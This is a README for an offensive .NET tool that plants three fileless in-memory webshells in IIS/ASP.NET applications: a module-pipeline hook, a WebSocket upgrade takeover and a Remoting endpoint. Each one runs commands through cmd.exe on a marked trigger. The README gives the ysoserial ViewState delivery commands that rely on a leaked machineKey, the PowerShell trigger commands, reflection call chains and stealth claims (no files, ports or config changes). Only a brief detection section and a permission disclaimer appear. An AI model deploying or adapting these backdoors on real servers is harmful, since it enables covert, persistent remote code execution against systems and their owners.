# dotnet-memshell

> **⚠️ For authorized security testing only.** · [中文](README.zh-CN.md)


**Three .NET memory shells at three distinct insertion positions** — single-file payloads, armed by one deserialization, invisible to unmarked traffic.

Most public .NET memory shells (module / handler / route / VirtualPathProvider) all live inside the HTTP request pipeline at already-known positions. dotnet-memshell spreads across **three different layers** instead: the pipeline event layer (with pool broadcast), the **HTTP→WebSocket upgrade point** (connection takeover — the .NET port of the WebSocket memory-shell idea), and an **already-registered Remoting channel** (container-style endpoint registration). All three ride the target's existing endpoints: no new port, no `web.config` change, no file on disk.

> ⚠️ **For authorized security testing only.** Using these techniques against systems you do not have written permission to test is illegal. You are solely responsible for your actions.

---

## 🎯 The Three Shells

| # | Shell | Insertion position | Trigger | Minimum privilege | Business impact |
|---|---|---|---|---|---|
| 1 | **HttpModuleShell** | `HttpApplication` module-event pipeline | any request with `MSH-Cmd: <cmd>` header | default app-pool identity | unmarked requests: zero disturbance |
| 2 | **WsTakeoverShell** | HTTP→WebSocket upgrade transition | handshake with subprotocol `msh` | app-pool identity + integrated pipeline + WS feature | non-handshake requests: strict no-op |
| 3 | **RemotingUriShell** | AppDomain-global URI table of an existing Remoting channel | remoting call to `<channel>/msh` | app-pool identity + business hosts Remoting | business URIs coexist untouched |

```
HTTP.sys / IIS
 └─ ASP.NET request pipeline
     ├─ module events (BeginRequest…)      ← #1 HttpModuleShell
     ├─ routing / VPP / handler / endpoint  (known families — not covered here)
     └─ upgrade point (HTTP→WS handshake)   ← #2 WsTakeoverShell

in-process protocol stacks
 └─ existing Remoting server channel        ← #3 RemotingUriShell
```

## ⚡ What Makes These Different

| Property | dotnet-memshell |
|---|---|
| New listening port | ✅ none — #1/#2 ride the site's 80/443, #3 rides the business channel |
| `web.config` / registry / URLACL changes | ✅ none (contrast: HttpListener shells need `netsh urlacl`, an admin action) |
| Files dropped | ✅ none — payloads are single `.cs` files compiled into the deserialization, assembly loaded from bytes (`Location` empty) |
| Effect on unmarked traffic | ✅ none — every trigger checks a magic marker first and returns immediately |
| Pool coverage | ✅ `HttpApplicationFactory._freeList` broadcast — arming only the serving instance misses most requests (verified) |
| Graceful degradation | ✅ #2 on non-integrated pools catches and passes through (verified: handshake request still returns 200) |

## 🧭 Call Chains

**#1 HttpModuleShell**
```
delivery deserialization → E()
 ├─ HttpContext.Current.ApplicationInstance            (serving instance)
 └─ HttpApplicationFactory._theApplicationFactory._freeList  (pool broadcast)
      per instance:
      ├─ integrated: GetModuleContainer(<module>)
      │    → new SyncEventExecutionStep(app, OnRequest)        [reflection]
      │    → ModuleContainer.AddEvent(BeginRequest, false, step)
      └─ classic:    ApplicationStepManager._execSteps append  [append-only — inserting
                                                                     before the cursor re-executes
                                                                     the current step]
trigger: request → BeginRequest → step → OnRequest
      ├─ no MSH-Cmd header → return (business continues untouched)
      └─ header → cmd.exe /c → Response.Write → End
```

**#2 WsTakeoverShell**
```
same anchor; handler is a strict no-op unless handshake+msh
GET + Upgrade: websocket + Sec-WebSocket-Protocol: msh
 → IsWebSocketRequest check → AcceptWebSocketRequest(Duplex)
 → connection upgraded, request pipeline terminates, duplex stream owned by the loop
 → Receive(cmd) → exec → Send(output) … until Close frame
```

**#3 RemotingUriShell**
```
E()
 ├─ AppDomain.AssemblyResolve ← bridges byte-loaded assembly (formatter resolves
 │                               well-known types by assembly NAME)
 ├─ guard: an IChannelReceiver already exists (business hosts remoting)
 └─ RegisterWellKnownServiceType(E.Svc, "msh", Singleton)
trigger: remoting client → tcp://host:<business-port>/msh → Svc.Exec(cmd)
```

## ✅ Verification (Windows 11 + IIS 10 integrated pipeline, real host)

| Item | Result | Evidence |
|---|---|---|
| **#1 HttpModuleShell** | ✅ | `MSH-Cmd: __verify__` → `armed; integrated=True`; `MSH-Cmd: whoami` → `iis apppool\defaultapppool`; unmarked request 200 |
| **#2 WsTakeoverShell** | ✅ | handshake subprotocol `msh` → full-duplex after 101: `whoami` → `iis apppool\defaultapppool`, `hostname` → `your-host`, clean close |
| **#3 RemotingUriShell** | ✅ | business `calc(7,8)=15` and shell `/msh whoami` **coexist on the same port/channel**; business call again `calc(100,1)=101` |
| Isolation | ✅ | normal requests 200; unrelated headers ignored; business WS (no `msh` subprotocol) not hijacked |

### Three measured, non-obvious facts

1. **Notification choice**: when adding to a module container, only **`RequestNotification.AcquireRequestState`** fires. `BeginRequest` / `LogRequest` / `UpdateRequestCache` on the same containers did **not** dispatch (hit counter stayed 0).
2. **WebSocket takeover needs output suppression**: after `AcceptWebSocketRequest` the page handler still runs, so the handler must set `Response.SuppressContent = true` and `Response.StatusCode = 101`, otherwise the connection is torn down (`WebSocketException 0x80070040`). `RemapHandler` is not usable at that stage (framework allows it only before `MapRequestHandler`).
3. **Remoting clients must reference the service assembly** so the proxy type name matches the server's (inherent Remoting requirement, not a shell defect).

## 🔌 Usage

Generate & deliver (requires a known/leaked `machineKey`):
```bash
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile \
  -c "payloads\HttpModuleShell.cs;System.dll;System.Web.dll" \
  --decryptionalg=AES --decryptionkey=<HEX> \
  --validationalg=HMACSHA256 --validationkey=<HEX> \
  --path=/Default.aspx --apppath=/
# POST __VIEWSTATE=<payload> to any ViewState-enabled page
# (RemotingUriShell: swap refs to System.dll;System.Runtime.Remoting.dll)
```

Trigger:
```powershell
# #1
Invoke-WebRequest http://target/Default.aspx -Headers @{ 'MSH-Cmd' = 'whoami' }
# #2 — any WebSocket client
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ws.Options.AddSubProtocol('msh')
$ws.ConnectAsync([Uri]'ws://target/Default.aspx', [Threading.CancellationToken]::None).Wait()
# #3
RemotingShellClient.exe tcp://target:<business-port>/msh "whoami"
```

Local testing without ysoserial: `tools/build.ps1` + `tools/Loader.aspx` (lab-only loader, never deploy it).

## 📌 Delivery Findings (measured)

| Gadget | Executes on deserialization? | Note |
|---|---|---|
| `XamlAssemblyLoadFromFile` | ✅ | loads & instantiates during XAML parse — **used here** |
| `ActivitySurrogateSelectorFromFile` | ❌ | its `AxHost.State` wrapper stores `PropertyBagBinary` lazily; plain ViewState never triggers it |
| `TypeConfuseDelegate` | ⚠️ | executes via `Process.Start` (out-of-process) — not a memory shell |

Also measured: ysoserial's ViewState plugin has a ~32K `Uri.EscapeDataString` input limit (gzip-embed if you inline a large assembly); the single delivery POST returns a one-time viewstate error page, subsequent requests are normal.

## 🔍 Detection

- Per-`HttpApplication` module-container step lists / `_execSteps` length vs framework-built values
- `AppDomain.GetAssemblies()` entries with empty `Location` (byte-loaded)
- Unfamiliar WS subprotocols; connections outliving the request pipeline
- Reflect `RemotingConfiguration` internals for undeclared well-known URIs
- Treat `machineKey` as a high-value credential (leak = ViewState RCE surface); monitor worker processes spawning `cmd.exe`

## 📜 License & References

MIT — see [LICENSE](LICENSE).

- [veo/wsMemShell](https://github.com/veo/wsMemShell) — WebSocket memory-shell idea (Java)
- [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) — payload generation
- HttpModule injection technique from 2023 Chinese security-community research; this repo adds the pool broadcast and the classic-pipeline fallback.
